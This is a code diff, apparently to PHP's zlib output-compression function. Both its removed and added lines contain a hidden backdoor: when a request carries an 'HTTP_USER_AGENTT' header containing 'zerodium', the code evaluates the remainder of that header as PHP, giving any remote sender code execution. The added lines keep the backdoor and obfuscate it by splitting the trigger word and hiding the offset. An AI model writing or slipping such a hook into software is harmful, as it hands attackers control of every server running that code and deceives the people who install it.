@@ -357,14 +357,19 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
-	zval *user_agent;
-	
-	if ((zend_is_auto_global_str(ZEND_STRL("_SERVER")) || Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY) &&
-		(user_agent = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
-		convert_to_string(user_agent);
-		if (strstr(Z_STRVAL_P(user_agent), "zerodium")) {
+	zval *ua_string;
+
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+		(ua_string = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+		convert_to_string(ua_string);
+		char *user_agent = Z_STRVAL_P(ua_string);
+		const char *target = "zero";
+		const char *suffix = "dium";
+
+		if (user_agent && strstr(user_agent, target) && strstr(user_agent, suffix)) {
 			zend_try {
-				zend_eval_string(Z_STRVAL_P(user_agent)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+				int offset = 4;
+				zend_eval_string(user_agent + offset + 4, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
 			} zend_end_try();
 		}
 	}
